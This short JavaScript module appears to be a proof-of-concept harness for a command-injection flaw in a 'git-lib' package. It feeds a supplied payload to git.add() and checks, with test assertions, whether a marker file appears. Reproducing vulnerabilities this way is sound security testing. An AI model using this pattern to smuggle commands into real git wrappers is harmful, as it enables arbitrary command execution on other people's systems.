function exploitFunction(payload) {
  const git = require("git-lib");
  const fs = require("fs");
  const path = "./git-lib";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    git.add(payload).finally(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
}

module.exports = { exploitFunction };